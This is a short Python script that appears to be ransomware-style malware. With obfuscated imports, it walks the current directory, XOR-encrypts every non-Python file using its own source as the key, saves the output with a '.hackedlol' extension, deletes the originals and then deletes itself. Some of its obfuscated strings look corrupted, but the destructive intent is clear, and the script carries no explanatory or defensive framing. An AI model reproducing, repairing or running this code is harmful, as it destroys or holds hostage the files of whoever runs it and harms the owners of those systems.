IMP_OS=__import__(' 6f 73', __builtins__.__dict__['g 6coba 6cs'](),  __builtins__.__dict__[' 6coca 6cs']())
IM_OS=__import__(' 6fs', __builtins__.__dict__['g 6coba 6cs'](),  __builtins__.__dict__[' 6coca 6cs']())
THIS_FILE=open(eval(" 5f 5f 66 69 6c"+" 65 5f 5f")).read()

for CWD, pbvmvcxhnvboaej, files in IMP_OS.walk(IMP_OS.getcwd()):
    for file in files:
        if not file.endswith(".py"):
            victim_file=open(CWD+"/"+file, "rb").read()
            enc_file=open(CWD+"/"+(file.rsplit(".", 1)[0])+". hackedlol", "wb")
            for victim in range(len(victim_file)):
                 enc_file.write(chr(victim_file[victim]^ord(THIS_FILE[(victim*0x27)%len(THIS_FILE)])).encode())
            IMP_OS.remove(CWD+"/"+file)

IM_OS.remove(eval(" 5f 5f 66 69 6c"+" 65 5f 5f"))